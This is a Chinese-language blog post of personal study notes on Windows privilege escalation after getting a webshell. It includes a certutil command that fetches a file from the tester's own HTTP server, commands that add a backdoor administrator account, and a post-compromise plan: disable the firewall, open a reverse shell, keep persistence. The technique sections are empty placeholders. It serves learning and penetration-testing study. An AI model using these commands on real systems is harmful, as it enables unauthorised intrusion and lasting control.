---
layout:     post
title:      权限提升（一）Windows提权
subtitle:   这个系列是整理学习安全的笔记，记录一些学习到的提权的知识，还有一些提权相关工具的使用，脚本可能不会贴源码，因为都是从别人搜集的开源exp中拿过来用的，已知出处的会附加链接。本章是记录Windows提权，可能不全，只是前段时间蹭课学到记录下来的。
date:       2020-12-24
author:     HouKC
header-img: img/post-bg-art.jpg
catalog:    true
tags:
    - CTF
    - windows
    - 网络安全
    - 学习笔记
    - 权限提升
    - 漏洞利用
---



## 0x00 什么是提权

主要针对网站测试过程中，当测试某一网站时，通过各种漏洞提升Webshell权限，以夺得服务器系统权限。



## 0x01 有用的知识点

#### 1. 通常脚本所处的权限

- asp/php    匿名权限
- aspx    user权限
- jsp    通常是系统权限

#### 2. 突破cmd受限

目标windows可能存在如下几种情况限制了cmd的调用执行：

- 防护软件拦截
- cmd被降权
- 组件被删除


突破的方法是：找可读写目录上传cmd.exe，将执行的cmd.exe路径替换成上传的路径，再次调用执行。

#### 3. windows靶机下载文件

首先在本地起一个HTTP服务，用python3示例：

```
python -m http.server 4444
```

假设本地的IP为192.168.1.115（靶机要访问得到），接着在靶机运行下面命令。

```powershell
certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt c:\a.txt          # 下载链接中的robots.txt文件保存到c盘a.txt文件中  
certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt delete            # 清理缓存
```



## 0x02 挖洞getshell后的一般流程和思路

- 服务器信息搜集（系统信息、端口扫描等）
- 提权（利用数据库漏洞、系统漏洞、第三方软件漏洞等）
- 提权后可以创建系统账户、开放远程桌面、关闭防火墙等进一步控制
- 内网信息搜集（IP段\&端口扫描、域信息搜集等）
- 找其他服务器及其开放的服务（windows最重要的是找到域控服务器）
- 控制并提权其他服务器（利用各种服务漏洞、系统漏洞或者站点漏洞等控制并提权）
- 需要时应做端口转发或者建立反向shell（绕过防火墙）
- 权限维持（可以用CS集中控制shell）



## 0x03 信息搜集

- 内外网
- 服务器系统和版本、位数
- 服务器的补丁情况
- 服务器的安装软件情况
- 服务器的防护软件情况
- 端口情况
- 支持脚本情况
- ......

```
ipconfig /all 	# 查看当前ip
net user 		# 查看当前服务器账号情况
netstat -ano 	# 查看当前服务器端口开放情况
ver 			# 查看当前服务器操作系统
systeminfo 		# 查看当前服务器配置信息（补丁情况）
wmic qfe get Caption,Description,HotFixID,InstalledOn		# 获取系统补丁信息
taskkill -PID [pid号] 		   # 结束某个pid号的进程
taskkill /im qq.exe /f 			# 结束QQ进程
net user abc 123 /add 			# 添加一个用户名为abc密码为123的用户
net localgroup administrators abc /add 		# 将用户abc添加到管理员组
whoami 			# 查看当前操作用户（当前权限）
hostname		# 查看当前计算机名称

# 获取防火墙有关信息(仅用于XP SP2及更高版本)：
netsh firewall show state
netsh firewall show config

# 获取所有计划任务的详细输出（需要先设置为美国编码437，默认是中文编码936）：
chcp 437
schtasks /query /fo LIST /v

获取主机名运行的进程：
tasklist /SVC
- 看杀软    360，主动防御、火绒(usysdiag.exe进程)
- 看其他软件提权     tomcat（权限高）、iis（权限低）、redius提权等
```



## 0x04 windows提权

#### 1. 第三方软件提权

#### 2. 溢出提权

#### 3. 启动项提权

#### 4. 破解hash提权

#### 5. 数据库提权

未更完待续。



## 0xff 常见windows存在的漏洞端口
- 445 ms17-010 永恒之蓝（windows 10 以前）
- 3389 CVE-2019-0708 BlueKeep（windows7/windows2008）
- 445 ms08-067（windows2008以前）